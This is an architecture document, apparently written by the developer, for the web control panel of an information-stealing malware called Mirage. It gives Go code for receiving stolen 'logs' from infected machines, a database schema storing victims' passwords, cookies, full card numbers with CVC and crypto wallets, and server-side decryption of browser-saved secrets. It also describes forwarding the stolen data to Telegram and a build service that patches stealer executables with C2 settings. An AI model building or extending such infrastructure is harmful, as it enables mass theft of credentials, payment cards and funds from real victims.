# Eidos Web Panel — Architecture

## 1. System Overview

Eidos Web Panel — замена текущему WPF-панели (Mirage.Panel). Это **Go-сервер с встроенным React-фронтендом** в одном бинарнике.

```
┌──────────────────────────────────────────────────────────┐
│                    Client (Browser)                       │
│  React SPA (shadcn/ui) ← HTTPS → Go API + WebSocket     │
└──────────────────────┬───────────────────────────────────┘
                       │
┌──────────────────────┴───────────────────────────────────┐
│                    Eidos Panel Server                     │
│                                                          │
│  ┌─────────────┐  ┌──────────────┐  ┌────────────────┐  │
│  │  REST API   │  │  WebSocket   │  │  Services      │  │
│  │  (chi/jwt)  │  │  (gorilla)   │  │  LogProcessor  │  │
│  │             │  │              │  │  SSP Decrypt   │  │
│  │  ─ /auth    │  │  ─ /ws       │  │  BuildService  │  │
│  │  ─ /stats   │  │  live logs   │  │  TelegramProxy │  │
│  │  ─ /sessions│  │  stats push  │  └────────────────┘  │
│  │  ─ /build   │  │              │                       │
│  │  ─ /log     │  └──────────────┘                       │
│  └──────┬──────┘                                         │
│         │                                                 │
│  ┌──────┴────────────────────────────────────────┐        │
│  │            SQLite (или PostgreSQL)              │        │
│  │  sessions │ passwords │ cookies │ cards │ ...  │        │
│  └─────────────────────────────────────────────────┘        │
│                                                          │
│  ┌────────────────────────────────────────────────┐       │
│  │  Static Files (embedded via //go:embed)         │       │
│  │  React SPA — index.html + .js + .css           │       │
│  └────────────────────────────────────────────────┘       │
└──────────────────────────────────────────────────────────┘
```

---

## 2. Backend Components

### 2.1 HTTP Layer (chi)

```go
r := chi.NewRouter()

// Global middleware
r.Use(middleware.RequestID)
r.Use(middleware.RealIP)
r.Use(middleware.Logger)       // slog-based
r.Use(middleware.Recoverer)
r.Use(middleware.Timeout(30 * time.Second))

// Auth routes
r.Route("/api/auth", func(r chi.Router) {
    r.Post("/login", authHandler.Login)
})

// Protected API
r.Group(func(r chi.Router) {
    r.Use(authMiddleware)           // JWT validation
    r.Use(rateLimitMiddleware)      // Per-IP rate limiting

    r.Get("/api/stats", statsHandler.Dashboard)
    r.Get("/api/sessions", sessionsHandler.List)
    r.Get("/api/sessions/{id}", sessionsHandler.Detail)
    r.Delete("/api/sessions/{id}", sessionsHandler.Delete)
    r.Get("/api/search", searchHandler.Search)

    r.Post("/api/log", logHandler.Ingest)
    r.Post("/api/log/chunk", logHandler.Chunk)
    r.Post("/api/log/complete", logHandler.CompleteChunked)
    r.Post("/api/log/ssp", logHandler.ServerSide)

    r.Post("/api/build", buildHandler.Build)
    r.Get("/api/build/{id}/download", buildHandler.Download)

    r.Get("/api/bans", bansHandler.List)
    r.Post("/api/bans", bansHandler.Create)
    r.Delete("/api/bans/{id}", bansHandler.Delete)

    r.Get("/api/settings", settingsHandler.Get)
    r.Put("/api/settings", settingsHandler.Update)
})

// WebSocket
r.Get("/ws", wsHandler.Serve)

// Static files (embedded React SPA)
fileServer := http.FileServer(staticFS)
r.Handle("/*", fileServer)
```

### 2.2 Middleware Stack

| Middleware | Purpose |
|-----------|---------|
| RequestID | UUID per request для трейсинга |
| RealIP | Extract real IP from X-Forwarded-For |
| Logger | Structured request logging (slog) |
| Recoverer | Panic recovery, не роняет сервер |
| Timeout | 30s deadline per request |
| Auth | JWT Bearer token validation |
| Rate Limit | 100 req/min per IP (token bucket) |
| Payload Size | 100 MB max for uploads |

### 2.3 Authentication

```go
// JWT claims
type Claims struct {
    jwt.RegisteredClaims
    Role string `json:"role"` // "admin", "user"
}

// Login
func (h *AuthHandler) Login(w http.ResponseWriter, r *http.Request) {
    var req LoginRequest
    json.NewDecoder(r.Body).Decode(&req)

    user, err := h.db.GetUser(req.Username)
    if err != nil || !bcrypt.CompareHashAndPassword(user.PasswordHash, req.Password) {
        http.Error(w, "invalid credentials", 401)
        return
    }

    token := jwt.NewWithClaims(jwt.SigningMethodHS256, Claims{
        RegisteredClaims: jwt.RegisteredClaims{
            ExpiresAt: jwt.NewNumericDate(time.Now().Add(24 * time.Hour)),
            IssuedAt:  jwt.NewNumericDate(time.Now()),
        },
        Role: user.Role,
    })

    signed, _ := token.SignedString(h.jwtSecret)
    json.NewEncoder(w).Encode(LoginResponse{Token: signed})
}
```

### 2.4 WebSocket Hub

```go
type Hub struct {
    clients    map[*Client]bool
    broadcast  chan []byte
    register   chan *Client
    unregister chan *Client
}

func (h *Hub) Run() {
    for {
        select {
        case client := <-h.register:
            h.clients[client] = true
        case client := <-h.unregister:
            delete(h.clients, client)
            close(client.send)
        case message := <-h.broadcast:
            for client := range h.clients {
                select {
                case client.send <- message:
                default:
                    close(client.send)
                    delete(h.clients, client)
                }
            }
        }
    }
}
```

WebSocket отправляет события:
- `new_session` — новый лог принят и обработан
- `stats_update` — обновление статистики
- `build_complete` — билд готов

---

## 3. Database Schema

```sql
-- Migrations/001_initial.sql

CREATE TABLE users (
    id              TEXT PRIMARY KEY,
    username        TEXT NOT NULL UNIQUE,
    password_hash   TEXT NOT NULL,
    role            TEXT NOT NULL DEFAULT 'admin',
    created_at      DATETIME DEFAULT CURRENT_TIMESTAMP
);

CREATE TABLE builds (
    id              TEXT PRIMARY KEY,
    version         TEXT,
    config_hash     TEXT,
    file_size       INTEGER,
    file_data       BLOB,            -- The built PE
    created_at      DATETIME DEFAULT CURRENT_TIMESTAMP
);

CREATE TABLE sessions (
    id              TEXT PRIMARY KEY,
    build_id        TEXT REFERENCES builds(id),
    hwid            TEXT,
    os              TEXT,
    username        TEXT,
    ip              TEXT,
    country_code    TEXT,
    created_at      DATETIME DEFAULT CURRENT_TIMESTAMP
);
CREATE INDEX idx_sessions_created ON sessions(created_at DESC);
CREATE INDEX idx_sessions_country ON sessions(country_code);
CREATE INDEX idx_sessions_hwid ON sessions(hwid);

CREATE TABLE passwords (
    id              TEXT PRIMARY KEY,
    session_id      TEXT NOT NULL REFERENCES sessions(id) ON DELETE CASCADE,
    url             TEXT,
    username        TEXT,
    password_value  TEXT,
    browser         TEXT
);
CREATE INDEX idx_passwords_session ON passwords(session_id);
CREATE INDEX idx_passwords_url ON passwords(url);

CREATE TABLE cookies (
    id              TEXT PRIMARY KEY,
    session_id      TEXT NOT NULL REFERENCES sessions(id) ON DELETE CASCADE,
    domain          TEXT,
    name            TEXT,
    value           TEXT,
    path            TEXT
);
CREATE INDEX idx_cookies_session ON cookies(session_id);

CREATE TABLE cards (
    id              TEXT PRIMARY KEY,
    session_id      TEXT NOT NULL REFERENCES sessions(id) ON DELETE CASCADE,
    number          TEXT,
    exp_month       TEXT,
    exp_year        TEXT,
    holder          TEXT,
    cvc             TEXT
);
CREATE INDEX idx_cards_session ON cards(session_id);

CREATE TABLE wallets (
    id              TEXT PRIMARY KEY,
    session_id      TEXT NOT NULL REFERENCES sessions(id) ON DELETE CASCADE,
    name            TEXT,
    path            TEXT
);
CREATE INDEX idx_wallets_session ON wallets(session_id);

CREATE TABLE stolen_files (
    id              TEXT PRIMARY KEY,
    session_id      TEXT NOT NULL REFERENCES sessions(id) ON DELETE CASCADE,
    filename        TEXT,
    size            INTEGER
);
CREATE INDEX idx_files_session ON stolen_files(session_id);

CREATE TABLE system_info (
    session_id      TEXT PRIMARY KEY REFERENCES sessions(id) ON DELETE CASCADE,
    cpu             TEXT,
    gpu             TEXT,
    ram             TEXT,
    os              TEXT,
    screen          TEXT,
    hostname        TEXT,
    local_ip        TEXT,
    mac             TEXT,
    public_ip       TEXT,
    hwid            TEXT,
    uptime          TEXT
);

CREATE TABLE bans (
    id              TEXT PRIMARY KEY,
    ip              TEXT NOT NULL,
    reason          TEXT,
    banned_at       DATETIME DEFAULT CURRENT_TIMESTAMP
);
CREATE INDEX idx_bans_ip ON bans(ip);

CREATE TABLE settings (
    key             TEXT PRIMARY KEY,
    value           TEXT NOT NULL
);
-- Default settings:
-- panel.port = 8080
-- auth.token = <auto-generated>
-- telegram.token =
-- telegram.chat_id =
-- rate_limit = 100
```

---

## 4. Log Ingestion Flow

```
Stealer POST /api/log (multipart)
┌────────────┐
│ 1. Validate│ ← Auth token, payload size, rate limit
│ 2. Parse   │ ← Multipart: metadata JSON + archive ZIP
│ 3. Save    │ ← Raw ZIP to /data/logs/
│ 4. Process │ ← LogProcessor.Process()
│    ├── Parse ZIP entries (passwords.txt, cookies.txt, etc.)
│    ├── Path traversal protection
│    ├── Create Session + children in DB (transaction)
│    └── Reload with counts
│ 5. Forward │ ← TelegramProxy (if configured)
│ 6. Notify  │ ← WebSocket broadcast "new_session"
│ 7. Return  │ ← 200 OK
└────────────┘
```

### 4.1 Chunked Upload

```
Stealer                          Panel
  │                                │
  ├── POST /api/log/chunk ──────►  │  session_id + chunk_0 + data
  │                                │  (stored in temp dir)
  ├── POST /api/log/chunk ──────►  │  session_id + chunk_1 + data
  │                                │
  ├── ...                          │
  │                                │
  ├── POST /api/log/complete ───►  │  session_id + total_chunks
  │                                │  → reassemble → process
  │                                │
  │◄── 200 OK ────────────────────  │
```

Temp-файлы чанков хранятся в `/data/chunks/{session_id}/` с TTL-чисткой (goroutine каждые 5 минут удаляет папки старше 1 часа).

### 4.2 Server-Side Processing (SSP)

```
POST /api/log/ssp
Content-Type: application/zip
Body: raw browser profile archive (Login Data, Cookies, Web Data, etc.)

→ ServerSideDecrypt.Process()
    1. Extract master_key.bin
    2. For each browser profile:
       - Parse SQLite with modernc.org/sqlite
       - Decrypt AES-GCM fields (v10/v11 format)
       - Extract cookies, passwords, cards, history
    3. Store all in DB
    4. Return session_id
```

---

## 5. External Integrations

### 5.1 Telegram Proxy

```go
func (p *TelegramProxy) SendLog(token, chatID string, data []byte, filename, caption string) error {
    body := &bytes.Buffer{}
    writer := multipart.NewWriter(body)

    writer.WriteField("chat_id", chatID)
    writer.WriteField("caption", caption)

    part, _ := writer.CreateFormFile("document", filename)
    part.Write(data)
    writer.Close()

    req, _ := http.NewRequest("POST",
        fmt.Sprintf("https://api.telegram.org/bot%s/sendDocument", token),
        body,
    )
    req.Header.Set("Content-Type", writer.FormDataContentType())

    resp, err := p.client.Do(req)
    if err != nil || resp.StatusCode != 200 {
        return fmt.Errorf("telegram send failed: %w", err)
    }
    return nil
}
```

Timeout: 30s. Retry: 3 attempts with 1s backoff.

### 5.2 Build Service

```
POST /api/build
Body: BuildConfig { c2_host, c2_port, telegram_token, flags }

→ BuildService.Build()
    1. Load stealer EXE from embedded resources
    2. Find MIRAGECFG signature in .rdata
    3. AES-GCM encrypt config
    4. Patch bytes in-place
    5. (Optional) append MirageDecryptor.dll
    6. Store result in DB (builds.file_data)
    7. Return build_id

GET /api/build/{id}/download
→ Returns builds.file_data as application/x-dosexec
```

---

## 6. Security Model

| Layer | Mechanism |
|-------|-----------|
| Transport | TLS via reverse proxy (Caddy/nginx) |
| Auth | JWT (HS256, 24h expiry) |
| Password | BCrypt (cost 12) |
| Rate Limit | Token bucket, 100 req/min/IP |
| Payload | Max 100 MB per request |
| Path traversal | Reject ZIP entries containing `..` |
| SQL Injection | Parameterized queries (database/sql) |
| XSS | React escapes by default |
| CSRF | SameSite=Strict cookies + CORS |
| Brute force | IP ban after 10 failed auth attempts |

---

## 7. Data Flow (End-to-End)

```
  Victim                           Panel Server                    Operator
    │                                  │                             │
    │  POST /api/log                   │                             │
    │  (encrypted ZIP + metadata)      │                             │
    │ ───────────────────────────►     │                             │
    │                                  │                             │
    │                           1. Verify auth token                 │
    │                           2. Check rate limit                  │
    │                           3. Check ban list                    │
    │                           4. Save raw ZIP → /data/logs/        │
    │                           5. LogProcessor.Process()            │
    │                              ├─ Parse ZIP entries              │
    │                              ├─ Insert to SQLite               │
    │                              └─ Return Session                 │
    │                           6. TelegramProxy.SendLog()           │
    │                              (if configured)                   │
    │                           7. WS broadcast → new_session        │
    │                                  │                             │
    │◄── 200 OK ─────────────────────  │                             │
    │                                  │                             │
    │                                  │   ┌──────────────────────┐  │
    │                                  │   │  Dashboard auto-refresh│ │
    │                                  │   │  via WebSocket push    │ │
    │                                  │   │  or GET /api/stats     │ │
    │                                  │   └──────────────────────┘  │
    │                                  │                             │
    │                                  │   Operator clicks session   │
    │                                  │◄── GET /api/sessions/{id} ─ │
    │                                  │   ──────────────────────────│
    │                                  │                             │
    │                                  │── passwords, cookies, etc.─►│
    │                                  │                             │
```
